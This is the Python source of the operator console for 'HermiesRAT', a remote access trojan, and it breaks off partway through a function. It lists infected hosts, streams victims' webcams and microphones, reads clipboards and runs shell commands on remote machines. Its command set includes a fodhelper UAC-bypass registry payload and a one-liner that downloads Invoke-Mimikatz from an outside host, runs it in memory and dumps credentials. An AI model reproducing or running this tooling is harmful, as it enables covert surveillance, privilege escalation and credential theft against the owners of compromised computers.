import shlex, socket, threading, os, json, base64, io, time, secrets
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox

try:
    from PIL import Image, ImageTk
    _PIL_OK = True
except ImportError:
    _PIL_OK = False

import config, database
from config          import PORT
from database        import db_upsert, db_fetch_all, db_delete, db_update_note, db_connected
from messaging       import send_msg, recv_msg
from server          import clients, _lock, accept_loop, _map_geo_cache
from modules         import scan_modules, build_module_injection, get_loaded_modules, MODULE_DIR
from payload_center  import pc_save, get_library
from client_template import CLIENT_TEMPLATE
from troll_payloads  import TROLL_PAYLOADS

_payload_library = get_library()

#  palette — true dark, no compromise 
C = {
    "bg":        "#111113",   # window / canvas
    "bg1":       "#18181b",   # panels
    "bg2":       "#1e1e21",   # inputs / rows
    "bg3":       "#252529",   # hover / header rows
    "bg4":       "#2a2a2f",   # selected / pressed
    "border":    "#2e2e33",   # hairlines
    "border2":   "#3a3a40",   # stronger dividers
    "txt":       "#d4d4d8",   # primary text
    "txt2":      "#71717a",   # muted
    "txt3":      "#52525b",   # very dim
    "accent":    "#4ade80",   # green — HermiesRAT palette
    "accent2":   "#22c55e",
    "blue":      "#60a5fa",
    "red":       "#f87171",
    "amber":     "#fbbf24",
    "folder":    "#ca8a04",
}

FONT     = ("Consolas", 10)
FONT_SML = ("Consolas", 9)
FONT_MON = ("Consolas", 10)
FONT_HDR = ("Consolas", 9, "bold")


def _style_ttk(root):
    s = ttk.Style(root); s.theme_use("clam")
    kw = dict
    maps = {
        "TFrame":           kw(background=C["bg1"]),
        "TLabel":           kw(background=C["bg1"], foreground=C["txt"], font=FONT),
        "TButton":          kw(background=C["bg2"], foreground=C["txt"], font=FONT,
                               borderwidth=1, relief="flat", padding=(8,3)),
        "Accent.TButton":   kw(background=C["accent"], foreground="#000000",
                               font=("Consolas",10,"bold"),
                               borderwidth=0, relief="flat", padding=(8,3)),
        "TEntry":           kw(fieldbackground=C["bg2"], foreground=C["txt"],
                               insertcolor=C["accent"], font=FONT,
                               borderwidth=0, relief="flat"),
        "Treeview":         kw(background=C["bg1"], foreground=C["txt"],
                               fieldbackground=C["bg1"], font=FONT,
                               rowheight=20, borderwidth=0),
        "Treeview.Heading": kw(background=C["bg3"], foreground=C["txt2"],
                               font=FONT_HDR, relief="flat"),
        "TScrollbar":       kw(background=C["bg2"], troughcolor=C["bg"],
                               arrowcolor=C["txt3"], borderwidth=0,
                               arrowsize=10, width=6),
        "TCombobox":        kw(fieldbackground=C["bg2"], background=C["bg2"],
                               foreground=C["txt"], font=FONT),
        "TCheckbutton":     kw(background=C["bg1"], foreground=C["txt"], font=FONT),
        "TPanedwindow":     kw(background=C["border"]),
        "TSeparator":       kw(background=C["border"]),
    }
    for n, o in maps.items():
        s.configure(n, **o)
    s.map("TButton",
          background=[("active", C["bg4"]), ("pressed", C["accent"])],
          foreground=[("active", C["accent"])])
    s.map("Accent.TButton",
          background=[("active", C["accent2"])])
    s.map("Treeview",
          background=[("selected", C["bg4"])],
          foreground=[("selected", C["accent"])])
    s.map("TEntry",
          fieldbackground=[("focus", C["bg3"])],
          foreground=[("focus", C["txt"])])


# 
#  POPUP WINDOWS
# 

class ScreenshotWindow(tk.Toplevel):
    def __init__(self, master, pil_img):
        super().__init__(master)
        self.title("Screenshot")
        self.configure(bg=C["bg"])
        w, h = min(pil_img.width, 1400), min(pil_img.height, 900)
        self.geometry(f"{w}x{h+40}")
        self.resizable(True, True)
        self._pil = pil_img
        self._tk_img = None
        self._lbl = tk.Label(self, bg=C["bg"])
        self._lbl.pack(fill=tk.BOTH, expand=True)
        bar = tk.Frame(self, bg=C["bg1"], height=36)
        bar.pack(fill=tk.X, side=tk.BOTTOM); bar.pack_propagate(False)
        tk.Button(bar, text="save png", bg=C["bg2"], fg=C["txt"],
                  font=FONT, relief="flat", padx=10,
                  command=self._save).pack(side=tk.RIGHT, padx=8, pady=5)
        self.bind("<Configure>", lambda e: self._resize())
        self._resize()

    def _resize(self):
        w = max(self._lbl.winfo_width(), 100)
        h = max(self._lbl.winfo_height(), 100)
        thumb = self._pil.copy(); thumb.thumbnail((w, h), Image.LANCZOS)
        self._tk_img = ImageTk.PhotoImage(thumb)
        self._lbl.configure(image=self._tk_img)

    def _save(self):
        p = filedialog.asksaveasfilename(
            defaultextension=".png",
            filetypes=[("PNG","*.png"),("All","*.*")])
        if p: self._pil.save(p)


class CameraWindow(tk.Toplevel):
    def __init__(self, master, gui_ref):
        super().__init__(master)
        self.title("Webcam")
        self.geometry("800x640")
        self.configure(bg=C["bg"])
        self.resizable(True, True)
        self._gui   = gui_ref
        self._alive = True
        self._tk_img = None
        self._frame_times = []

        self._lbl = tk.Label(self, bg=C["bg"], text="no feed", fg=C["txt2"], font=FONT)
        self._lbl.pack(fill=tk.BOTH, expand=True)
        bar = tk.Frame(self, bg=C["bg1"], height=36)
        bar.pack(fill=tk.X, side=tk.BOTTOM); bar.pack_propagate(False)
        self._fps_lbl = tk.Label(bar, text="", bg=C["bg1"], fg=C["accent"], font=FONT_SML)
        self._fps_lbl.pack(side=tk.LEFT, padx=8)
        self.protocol("WM_DELETE_WINDOW", self._close)

    def push_frame(self, pil_img):
        if not self._alive: return
        now = time.time()
        self._frame_times.append(now)
        self._frame_times = [t for t in self._frame_times if t >= now - 2.0]
        fps = len(self._frame_times) / 2.0
        def _upd():
            if not self._alive: return
            w = max(self._lbl.winfo_width(), 200)
            h = max(self._lbl.winfo_height(), 150)
            thumb = pil_img.copy(); thumb.thumbnail((w, h), Image.LANCZOS)
            self._tk_img = ImageTk.PhotoImage(thumb)
            self._lbl.configure(image=self._tk_img, text="")
            self._fps_lbl.configure(text=f"{fps:.1f} fps")
        self.after(0, _upd)

    def _close(self):
        self._alive = False
        self._gui._cam_win = None
        self._gui._cam_streaming = False
        self.destroy()


# 
#  MAIN WINDOW
# 

class HermiesRATGUI(tk.Tk):

    def __init__(self):
        super().__init__()
        self._load_icons()

        # state expected by _build_* methods
        self.selected_cid = None
        self._b_mod_vars = {}
        # add any others as they error out

        self.title("HermiesRAT Framework v1.0")
        self.geometry("1500x860")
        self.minsize(1100, 640)
        self.configure(bg=C["bg"])

        #  state 
        self.selected_cid       = None
        self._srv_sock          = None
        self._cam_streaming     = False
        self._cam_win           = None
        self._mic_streaming     = False
        self._mic_wav_data      = None
        self._mic_stream_frames = []
        self._ss_pil            = None
        self._b_mod_vars        = {}
        self._task_history      = []
        self._traffic_totals    = {"tx":0,"rx":0}
        self._traffic_per_cid   = {}
        self._dl_client_rows    = {}
        self._fb_entries        = []
        self._fb_sort_key       = "name"
        self._fb_sort_asc       = True
        self._fb_history        = []
        self._fb_hist_idx       = -1
        self._fb_selected_path  = None
        self._map_has_lib       = False
        self._map_markers       = {}
        self._map_dots          = {}
        self._term_history      = []
        self._term_hist_idx     = -1

        _style_ttk(self)
        self._build()

    # 
    #  LAYOUT
    # 

    def _build(self):
        self._build_titlebar()
        self._build_toolbar()

        # horizontal master split: left sidebar | right content
        h = tk.PanedWindow(self, orient=tk.HORIZONTAL,
                           bg=C["border"], sashwidth=2,
                           sashrelief="flat", handlesize=0)
        h.pack(fill=tk.BOTH, expand=True)

        self._build_sidebar(h)
        self._build_right(h)

    #  title bar 

    def _build_titlebar(self):
        tb = tk.Frame(self, bg=C["bg1"], height=26)
        tb.pack(fill=tk.X, side=tk.TOP); tb.pack_propagate(False)
        tk.Label(tb, text="HermiesRAT Framework  v1.0",
                 bg=C["bg1"], fg=C["txt2"], font=FONT_SML
                 ).pack(side=tk.LEFT, padx=12, pady=4)
        self._status_lbl = tk.Label(tb, text="● stopped",
                                    bg=C["bg1"], fg=C["txt3"], font=FONT_SML)
        self._status_lbl.pack(side=tk.RIGHT, padx=12, pady=4)
        self._listen_lbl = tk.Label(tb, text="",
                                    bg=C["bg1"], fg=C["txt3"], font=FONT_SML)
        self._listen_lbl.pack(side=tk.RIGHT, padx=(0,6), pady=4)
        tk.Frame(self, bg=C["border"], height=1).pack(fill=tk.X)

    #  icon toolbar ─

    def _build_toolbar(self):
        tb = tk.Frame(self, bg=C["bg1"], height=36)
        tb.pack(fill=tk.X); tb.pack_propagate(False)

        def _btn(text, tip, cmd):
            b = tk.Button(tb, text=text, bg=C["bg1"], fg=C["txt2"],
                          activebackground=C["bg3"], activeforeground=C["accent"],
                          font=("Segoe UI",11), relief="flat",
                          bd=0, padx=8, pady=4, cursor="hand2",
                          command=cmd)
            b.pack(side=tk.LEFT)
            return b

        _btn("⊟", "disconnect", self._disconnect)
        _btn("⟳", "refresh",   self.refresh_clients)
        tk.Frame(tb, bg=C["border"], width=1
                 ).pack(side=tk.LEFT, fill=tk.Y, padx=4, pady=6)
        _btn("⬛", "screenshot", self._screenshot_popup)
        _btn("📁", "files",     lambda: self._switch_tab("Files"))
        _btn("⌨",  "shell",     lambda: self._focus_terminal())
        _btn("🗺", "map",       lambda: self._switch_tab("Dashboard"))
        tk.Frame(tb, bg=C["border"], width=1
                 ).pack(side=tk.LEFT, fill=tk.Y, padx=4, pady=6)
        _btn("⚙",  "settings", lambda: self._switch_tab("Settings"))

        tk.Frame(self, bg=C["border"], height=1).pack(fill=tk.X)

    #  left sidebar: sessions table ─

    def _build_sidebar(self, parent):
        side = tk.Frame(parent, bg=C["bg1"])
        parent.add(side, minsize=320, width=400)

        hdr = tk.Frame(side, bg=C["bg1"], height=24)
        hdr.pack(fill=tk.X); hdr.pack_propagate(False)
        tk.Label(hdr, text="Sessions table",
                 bg=C["bg1"], fg=C["txt2"], font=FONT_SML
                 ).pack(side=tk.LEFT, padx=10, pady=4)
        tk.Button(hdr, text="⟳", bg=C["bg1"], fg=C["txt3"],
                  font=FONT_SML, relief="flat", bd=0,
                  command=self.refresh_clients
                  ).pack(side=tk.RIGHT, padx=6)
        tk.Frame(side, bg=C["border"], height=1).pack(fill=tk.X)

        cols = ("id","type","external","listener","internal","computer","user","os")
        self._sess_tree = ttk.Treeview(side, columns=cols,
                                       show="headings", selectmode="browse")
        col_cfg = [
            ("id",8,"Agent Id"),("type",6,"Type"),("external",13,"External"),
            ("listener",7,"Listener"),("internal",13,"Internal"),
            ("computer",10,"Computer"),("user",7,"User"),("os",12,"OS"),
        ]
        for key, w, lbl in col_cfg:
            self._sess_tree.heading(key, text=lbl)
            self._sess_tree.column(key, width=w*7, anchor="w", stretch=True)

        vsb = ttk.Scrollbar(side, orient=tk.VERTICAL,
                            command=self._sess_tree.yview)
        hsb = ttk.Scrollbar(side, orient=tk.HORIZONTAL,
                            command=self._sess_tree.xview)
        self._sess_tree.configure(yscrollcommand=vsb.set,
                                  xscrollcommand=hsb.set)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        hsb.pack(side=tk.BOTTOM, fill=tk.X)
        self._sess_tree.pack(fill=tk.BOTH, expand=True)
        self._sess_tree.bind("<<TreeviewSelect>>", self._sess_select)
        self._sess_tree.bind("<Button-3>", self._sess_rclick)
        self._sess_tree.tag_configure("selected_row",
                                      background=C["bg4"],
                                      foreground=C["accent"])

        # refresh loop
        self._refresh_sessions()

    def _refresh_sessions(self):
        self._sess_tree.delete(*self._sess_tree.get_children())
        with _lock:
            live = list(clients.items())
        for cid, info in live:
            ip    = info.get("label","")
            iip   = info.get("internal_ip", ip.split(":")[0])
            user  = info.get("user","")
            os_   = info.get("os","")
            ctype = info.get("type","beacon")
            comp  = info.get("computer","")
            lst   = info.get("listener","tcp")
            tags  = ("selected_row",) if cid == self.selected_cid else ()
            self._sess_tree.insert("", tk.END, iid=str(cid),
                                   values=(f"{cid:08x}", ctype, ip, lst,
                                           iip, comp, user, os_),
                                   tags=tags)
        self.after(3000, self._refresh_sessions)

    def refresh_clients(self):
        self._refresh_sessions()
        if hasattr(self, "_graph_canvas"):
            self._draw_graph()

    def _sess_select(self, event=None):
        sel = self._sess_tree.selection()
        if not sel: return
        try:    self.selected_cid = int(sel[0], 16)
        except: self.selected_cid = int(sel[0])
        self._refresh_sessions()
        self.log(f"selected client id={self.selected_cid}")
        # update graph highlight
        if hasattr(self, "_graph_canvas"):
            self._draw_graph()

    def _sess_rclick(self, event):
        row = self._sess_tree.identify_row(event.y)
        if not row: return
        self._sess_tree.selection_set(row)
        self._sess_select()
        self._show_ctx_menu(event, self.selected_cid)

    #  right: tab area 

    def _build_right(self, parent):
        right = tk.Frame(parent, bg=C["bg"])
        parent.add(right, minsize=700)

        # tab header
        tab_hdr = tk.Frame(right, bg=C["bg1"], height=28)
        tab_hdr.pack(fill=tk.X, side=tk.TOP); tab_hdr.pack_propagate(False)
        tk.Frame(right, bg=C["border"], height=1).pack(fill=tk.X, side=tk.TOP)

        self._content_area   = tk.Frame(right, bg=C["bg"])
        self._content_area.pack(fill=tk.BOTH, expand=True)

        self._tab_btns    = {}
        self._content_fms = {}
        self._active_tab  = None

        self._build_dashboard_tab()
        self._build_files_tab()
        self._build_builder_tab()
        self._build_settings_tab()
        self._build_logs_tab()

        for key, lbl in [("Dashboard","Dashboard"),("Files","Files"),
                         ("Builder","Builder"),("Settings","Settings"),
                         ("Logs","Logs")]:
            self._add_tab_btn(tab_hdr, key, lbl)

        self._switch_tab("Dashboard")

    def _add_tab_btn(self, parent, key, label):
        b = tk.Button(parent, text=label,
                      bg=C["bg1"], fg=C["txt3"],
                      activebackground=C["bg2"],
                      activeforeground=C["txt"],
                      font=FONT_SML, relief="flat", bd=0,
                      padx=14, pady=5, cursor="hand2",
                      command=lambda k=key: self._switch_tab(k))
        b.pack(side=tk.LEFT)
        self._tab_btns[key] = b

    def _switch_tab(self, name):
        for f in self._content_fms.values():
            f.place_forget()
        if name in self._content_fms:
            self._content_fms[name].place(
                relx=0, rely=0, relwidth=1, relheight=1)
        for k, b in self._tab_btns.items():
            if k == name:
                b.configure(bg=C["bg2"], fg=C["txt"],
                            font=("Consolas",9,"bold"))
            else:
                b.configure(bg=C["bg1"], fg=C["txt3"],
                            font=FONT_SML)
        self._active_tab = name
        if name == "Files" and self.selected_cid is not None:
            self._fb_navigate(self._fb_path_var.get())
        if name == "Settings":
            self._settings_refresh_db()

    def _make_frame(self, name):
        f = tk.Frame(self._content_area, bg=C["bg"])
        self._content_fms[name] = f
        return f

    # 
    #  DASHBOARD TAB  — graph top, terminal bottom
    # 

    def _build_dashboard_tab(self):
        f = self._make_frame("Dashboard")

        v = tk.PanedWindow(f, orient=tk.VERTICAL,
                           bg=C["border"], sashwidth=3,
                           sashrelief="flat", handlesize=0)
        v.pack(fill=tk.BOTH, expand=True)

        #  graph pane 
        graph_host = tk.Frame(v, bg=C["bg"])
        v.add(graph_host, minsize=160, height=320)

        g_hdr = tk.Frame(graph_host, bg=C["bg1"], height=24)
        g_hdr.pack(fill=tk.X); g_hdr.pack_propagate(False)
        tk.Label(g_hdr, text="Sessions Graph",
                 bg=C["bg1"], fg=C["txt2"], font=FONT_SML
                 ).pack(side=tk.LEFT, padx=10, pady=4)

        gc_host = tk.Frame(graph_host, bg=C["bg"])
        gc_host.pack(fill=tk.BOTH, expand=True)
        self._graph_canvas = tk.Canvas(
            gc_host, bg=C["bg"], highlightthickness=0,
            scrollregion=(0,0,2000,700))
        gsc_h = tk.Scrollbar(gc_host, orient=tk.HORIZONTAL,
                             command=self._graph_canvas.xview, bg=C["bg1"])
        gsc_v = tk.Scrollbar(gc_host, orient=tk.VERTICAL,
                             command=self._graph_canvas.yview, bg=C["bg1"])
        self._graph_canvas.configure(
            xscrollcommand=gsc_h.set, yscrollcommand=gsc_v.set)
        gsc_h.pack(side=tk.BOTTOM, fill=tk.X)
        gsc_v.pack(side=tk.RIGHT,  fill=tk.Y)
        self._graph_canvas.pack(fill=tk.BOTH, expand=True)
        self._draw_graph()

        #  terminal pane 
        term_host = tk.Frame(v, bg=C["bg"])
        v.add(term_host, minsize=160)

        t_hdr = tk.Frame(term_host, bg=C["bg1"], height=24)
        t_hdr.pack(fill=tk.X); t_hdr.pack_propagate(False)
        self._term_target_lbl = tk.Label(
            t_hdr, text="Console  [no session]",
            bg=C["bg1"], fg=C["txt2"], font=FONT_SML)
        self._term_target_lbl.pack(side=tk.LEFT, padx=10, pady=4)
        tk.Button(t_hdr, text="clear", bg=C["bg1"], fg=C["txt3"],
                  font=FONT_SML, relief="flat", bd=0,
                  command=self._term_clear).pack(side=tk.RIGHT, padx=8)
        tk.Frame(term_host, bg=C["border"], height=1).pack(fill=tk.X)

        self._term_out = scrolledtext.ScrolledText(
            term_host, bg=C["bg"], fg=C["txt"],
            font=FONT_MON, state="disabled",
            wrap=tk.WORD, relief="flat", borderwidth=0,
            insertbackground=C["accent"],
            selectbackground=C["bg4"],
            selectforeground=C["accent"])
        self._term_out.pack(fill=tk.BOTH, expand=True)

        input_row = tk.Frame(term_host, bg=C["bg1"], height=30)
        input_row.pack(fill=tk.X, side=tk.BOTTOM); input_row.pack_propagate(False)
        tk.Label(input_row, text=">", bg=C["bg1"],
                 fg=C["accent"], font=FONT_MON
                 ).pack(side=tk.LEFT, padx=(8,2), pady=5)
        self._term_entry = tk.Entry(
            input_row, bg=C["bg1"], fg=C["txt"],
            insertbackground=C["accent"], font=FONT_MON,
            relief="flat", highlightthickness=0)
        self._term_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, pady=5)
        self._term_entry.bind("<Return>",    self._term_submit)
        self._term_entry.bind("<Up>",        self._term_hist_up)
        self._term_entry.bind("<Down>",      self._term_hist_down)
        self._term_entry.bind("<Tab>",       self._term_tab_complete)

        # seed welcome
        self.after(200, lambda: self._term_print(
            "HermiesRAT console  —  type 'help' for commands\n"))

    # ------------------------------------------------------------------
    #  ICONS
    # ------------------------------------------------------------------
    def _load_icons(self):
        if getattr(self, "_icons_loaded", False):
            return
        import os
        self._icons = {}
        icon_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icons")
        print(f"[icons] dir: {icon_dir}")          # debug
        for name in ("server", "linux", "windows", "mac"):
            try:
                img = tk.PhotoImage(file=f"icons/{name}.png")
                if img.width() > 32:
                    img = img.subsample(img.width() // 32)
                self._icons[name] = img
            except Exception:
                # fallback: no icon file -> will draw text glyph instead
                self._icons[name] = None

    # ------------------------------------------------------------------
    #  GRAPH VIEW
    # ------------------------------------------------------------------
    def _draw_graph(self):
        c = self._graph_canvas
        c.delete("all")
        fw_x, fw_y = 160, 240

        # C2 node (image + label)
        srv_img = self._icons.get("server")
        if srv_img:
            c.create_image(fw_x, fw_y, image=srv_img)
        else:
            c.create_oval(fw_x-28, fw_y-28, fw_x+28, fw_y+28,
                          fill="#1a2a1a", outline=C["accent2"], width=2)
            c.create_text(fw_x, fw_y, text="SERVER",
                          fill=C["accent"], font=("Consolas", 10, "bold"))
        c.create_text(fw_x, fw_y+42, text="server",
                      fill=C["txt3"], font=FONT_SML)

        with _lock:
            live = list(clients.items())

        if not live:
            c.create_text(500, 240, text="no sessions",
                          fill=C["txt3"], font=FONT)
            return

        per_col = max(1, 500 // 110)
        positions = {}
        for i, (cid, info) in enumerate(live):
            col = i // per_col
            row = i % per_col
            x = 360 + col * 220
            y = 80 + row * 110
            positions[cid] = (x, y, info)

        for cid, (x, y, info) in positions.items():
            is_sel = (cid == self.selected_cid)
            lc = C["red"] if is_sel else C["accent"]

            # connector line
            c.create_line(fw_x+28, fw_y, x-30, y,
                          fill=lc, dash=(4, 4), width=1)
            mx = (fw_x+28 + x-30) / 2
            my = (fw_y + y) / 2
            proto = info.get("listener", "tcp")
            c.create_text(mx, my-9, text=proto,
                          fill=lc, font=("Consolas", 8))

            # node box
            os_str = info.get("os", "").lower()
            bc = "#0d1f0d" if "linux" in os_str else "#0d0d1f"
            c.create_rectangle(x-30, y-22, x+30, y+22,
                               fill=bc, outline=lc,
                               width=1 + (1 if is_sel else 0))

            # OS icon (image with text fallback)
            if "linux" in os_str:
                icon_name = "linux"
                fallback = "\U0001F427"      # 🐧
            elif "mac" in os_str:
                icon_name = "mac"
                fallback = "\U0001F34E"      # 🍎
            else:
                icon_name = "windows"
                fallback = "\u229E"          # ⊞

            img = self._icons.get(icon_name)
            if img:
                c.create_image(x, y-5, image=img)
            else:
                c.create_text(x, y-5, text=fallback, font=("Segoe UI", 12))

            # labels
            user = info.get("user", "?")
            comp = info.get("computer", "?")
            c.create_text(x, y+32, text=f"{user} @ {comp}",
                          fill=C["txt"], font=("Consolas", 8), anchor="n")
            c.create_text(x, y+44, text=f"{cid:08x}",
                          fill=C["txt3"], font=("Consolas", 8), anchor="n")

            # click region (drawn last so it stays on top)
            tag = f"node_{cid}"
            c.create_rectangle(x-30, y-22, x+30, y+45,
                               fill="", outline="", tags=(tag,))
            c.tag_bind(tag, "<Button-1>",
                       lambda e, _c=cid: self._graph_click(_c))
            c.tag_bind(tag, "<Button-3>",
                       lambda e, _c=cid: self._show_ctx_menu(e, _c))

    def _graph_click(self, cid):
        self.selected_cid = cid
        self._refresh_sessions()
        self._draw_graph()
        info = clients.get(cid, {})
        label = info.get("label", "")
        user = info.get("user", "")
        comp = info.get("computer", "")
        self._term_target_lbl.configure(
            text=f"Console  [{cid:08x}]  {user}@{comp}  {label}")
        self.log(f"selected {cid:08x}")

    # 
    #  TERMINAL ENGINE
    # 

    HELP_TEXT = """\
commands
─
  help                   show this list
  sessions               list active sessions
  select <id>            set active session (hex id)

  shell <cmd>            run cmd via auto-detected shell
  ps    <cmd>            force powershell
  bash  <cmd>            force bash
  cmd   <cmd>            force cmd.exe

  screenshot             grab screen → popup window
  webcam [start|stop]    live webcam → popup window
  mic record <secs>      record microphone
  mic stop               stop stream
  mic save               save captured audio

  upload <local_path>    upload file to current remote dir
  download               download selected file (Files tab)

  whoami                 quick recon (whoami /all)
  sysinfo                system information
  clipboard              read clipboard
  netstat                network interfaces
  ps_list                top processes by cpu
  privesc                fodhelper UAC bypass
  mimikatz               invoke mimikatz dump

  map                    show geo map of all sessions
  datalogs               show traffic log
  troll list             list troll payloads
  troll <name>           run named troll payload

  listen <port>          start/restart listener
  stop                   stop listener
  clear                  clear this console
─
"""

    def _term_print(self, text, color=None):
        def _do():
            self._term_out.configure(state="normal")
            if color:
                tag = f"c_{color.replace('#','')}"
                self._term_out.tag_configure(tag, foreground=color)
                self._term_out.insert(tk.END, text, tag)
            else:
                self._term_out.insert(tk.END, text)
            self._term_out.see(tk.END)
            self._term_out.configure(state="disabled")
        self.after(0, _do)

    def _term_clear(self):
        self._term_out.configure(state="normal")
        self._term_out.delete("1.0", tk.END)
        self._term_out.configure(state="disabled")

    def _term_prompt(self):
        cid = self.selected_cid
        if cid is None:
            return f"[no session] > "
        info  = clients.get(cid, {})
        user  = info.get("user","?")
        comp  = info.get("computer","?")
        return f"[{cid:08x}] {user}@{comp} > "

    def _focus_terminal(self):
        self._switch_tab("Dashboard")
        self.after(50, self._term_entry.focus_set)

    def _term_hist_up(self, event):
        if not self._term_history: return
        self._term_hist_idx = max(0, self._term_hist_idx - 1)
        self._term_entry.delete(0, tk.END)
        self._term_entry.insert(0, self._term_history[self._term_hist_idx])

    def _term_hist_down(self, event):
        if self._term_hist_idx >= len(self._term_history) - 1:
            self._term_entry.delete(0, tk.END)
            self._term_hist_idx = len(self._term_history)
            return
        self._term_hist_idx += 1
        self._term_entry.delete(0, tk.END)
        self._term_entry.insert(0, self._term_history[self._term_hist_idx])

    def _term_tab_complete(self, event):
        cmds = ["help","sessions","select","shell","ps","bash","cmd",
                "screenshot","webcam","mic","upload","download",
                "whoami","sysinfo","clipboard","netstat","ps_list",
                "privesc","mimikatz","map","datalogs","troll",
                "listen","stop","clear"]
        cur = self._term_entry.get().strip()
        matches = [c for c in cmds if c.startswith(cur)]
        if len(matches) == 1:
            self._term_entry.delete(0, tk.END)
            self._term_entry.insert(0, matches[0] + " ")
        elif len(matches) > 1:
            self._term_print("\n  " + "  ".join(matches) + "\n")
        return "break"

    def _term_submit(self, event=None):
        raw = self._term_entry.get().strip()
        if not raw: return
        self._term_entry.delete(0, tk.END)
        self._term_history.append(raw)
        self._term_hist_idx = len(self._term_history)
        prompt = self._term_prompt()
        self._term_print(prompt, C["accent"])
        self._term_print(raw + "\n")
        self._dispatch(raw)

    def _dispatch(self, raw):
        parts = raw.split(None, 1)
        cmd   = parts[0].lower()
        args  = parts[1].strip() if len(parts) > 1 else ""

        if cmd == "help":
            self._term_print(self.HELP_TEXT)

        elif cmd == "sessions":
            with _lock:
                live = list(clients.items())
            if not live:
                self._term_print("  no sessions\n", C["txt2"])
                return
            self._term_print(
                f"  {'id':10} {'user':14} {'computer':16} {'os':20} {'ip'}\n",
                C["txt2"])
            for cid, info in live:
                mark = "→ " if cid == self.selected_cid else "  "
                self._term_print(
                    f"{mark}{cid:08x}   {info.get('user','?'):<14}"
                    f"{info.get('computer','?'):<16}"
                    f"{info.get('os','?'):<20}"
                    f"{info.get('label','')}\n")

        elif cmd == "select":
            try:
                cid = int(args, 16)
                if cid not in clients:
                    self._term_print(f"  session {args} not found\n", C["red"])
                    return
                self.selected_cid = cid
                self._refresh_sessions()
                self._draw_graph()
                info  = clients[cid]
                self._term_target_lbl.configure(
                    text=f"Console  [{cid:08x}]  "
                         f"{info.get('user','?')}@{info.get('computer','?')}")
                self._term_print(f"  → {cid:08x}\n", C["accent"])
            except ValueError:
                self._term_print("  usage: select <hex_id>\n", C["red"])

        elif cmd in ("shell","ps","bash","cmd"):
            shell_map = {"ps":"powershell","bash":"bash","cmd":"cmd",
                         "shell":"auto"}
            self._term_inject(shell_map[cmd], args)

        elif cmd == "screenshot":
            self._screenshot_popup()

        elif cmd == "webcam":
            sub = args.lower()
            if sub in ("","start"):  self._cam_start()
            elif sub == "stop":      self._cam_stop()

        elif cmd == "mic":
            sub_parts = args.split(None,1)
            sub = sub_parts[0].lower() if sub_parts else ""
            if sub == "record":
                try:    dur = float(sub_parts[1]) if len(sub_parts)>1 else 5.0
                except: dur = 5.0
                self._mic_record(dur)
            elif sub == "stop":  self._mic_stop_stream()
            elif sub == "save":  self._mic_save()
            else: self._term_print("  mic [record <secs>|stop|save]\n", C["txt2"])

        elif cmd == "whoami":
            self._term_inject("auto",
                "whoami /all 2>&1 || id && uname -a && hostname")

        elif cmd == "sysinfo":
            self._term_inject("powershell",
                "Get-ComputerInfo | Select-Object CsName,OsName,OsVersion,"
                "OsArchitecture,CsProcessors,CsTotalPhysicalMemory")

        elif cmd == "clipboard":
            self._term_inject("powershell","Get-Clipboard")

        elif cmd == "netstat":
            self._term_inject("auto",
                "Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress"
                " 2>$null || ip a 2>/dev/null")

        elif cmd == "ps_list":
            self._term_inject("auto",
                "Get-Process | Sort CPU -Desc | Select -First 20 | "
                "Format-Table Name,Id,CPU -Auto 2>$null || "
                "ps aux --sort=-%cpu | head -20")

        elif cmd == "privesc":
            self._term_inject("powershell",
                "New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command "
                "-Value 'cmd.exe /c start cmd.exe' -Force; "
                "New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command "
                "-Name DelegateExecute -Value '' -Force; "
                "Start-Process fodhelper.exe -WindowStyle Hidden")

        elif cmd == "mimikatz":
            self._term_inject("powershell",
                "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/"
                "BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/"
                "Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds")

        elif cmd == "troll":
            if not args or args == "list":
                for cat, items in TROLL_PAYLOADS.items():
                    self._term_print(f"  {cat}:\n", C["txt2"])
                    for lbl,_,_ in items:
                        self._term_print(f"    {lbl}\n")
            else:
                for cat, items in TROLL_PAYLOADS.items():
                    for lbl, shell, c in items:
                        if lbl.lower() == args.lower():
                            self._term_inject(shell, c); return
                self._term_print(f"  not found: {args}\n", C["red"])

        elif cmd == "listen":
            try:    port = int(args) if args else PORT
            except: port = PORT
            ok = self._restart_listener(port)
            self._term_print(
                f"  listener {'up' if ok else 'failed'} :{port}\n",
                C["accent"] if ok else C["red"])

        elif cmd == "stop":
            if self._srv_sock:
                try: self._srv_sock.close()
                except: pass
                self._srv_sock = None
            self._status_lbl.configure(text="● stopped", fg=C["txt3"])
            self._listen_lbl.configure(text="")
            self._term_print("  listener stopped\n", C["txt2"])

        elif cmd == "clear":
            self._term_clear()

        elif cmd == "map":
            self._switch_tab("Dashboard")
            self._map_geo_all()

        elif cmd == "datalogs":
            with _lock: live = list(clients.items())
            self._term_print(
                f"\n  total ↑{self._traffic_totals['tx']/1024:.2f} KB  "
                f"↓{self._traffic_totals['rx']/1024:.2f} KB\n", C["txt2"])
            for cid, d in self._traffic_per_cid.items():
                self._term_print(
                    f"  {cid:08x}  ↑{d['tx']/1024:.2f}  ↓{d['rx']/1024:.2f} KB\n")

        elif cmd == "upload":
            self._fb_upload_path(args)

        elif cmd == "download":
            self._fb_download()

        else:
            # fallback: treat as raw shell command
            if args:
                self._term_inject("auto", raw)
            else:
                self._term_print(f"  unknown: {cmd}  (try 'help')\n", C["txt2"])

    def _term_inject(self, shell, cmd):
        if self.selected_cid is None:
            self._term_print("  no session selected  (use 'select <id>')\n",
                             C["red"]); return
        if shell == "auto":
            info   = clients.get(self.selected_cid, {})
            os_str = info.get("os","").lower()
            shell  = "bash" if "linux" in os_str or "darwin" in os_str else "powershell"
        self.log(f"[term/{shell}] {cmd[:60]}")
        threading.Thread(
            target=self._term_inject_worker,
            args=(clients[self.selected_cid]["sock"], shell, cmd),
            daemon=True).start()

    def _term_inject_worker(self, sock, shell, cmd):
        tx = rx = 0
        try:
            payload = json.dumps(
                {"cmd":"shell","data":{"shell":shell,"cmd":cmd}}).encode()
            tx = len(payload) + 4
            send_msg(sock, "shell", {"shell":shell,"cmd":cmd})
            resp = recv_msg(sock)
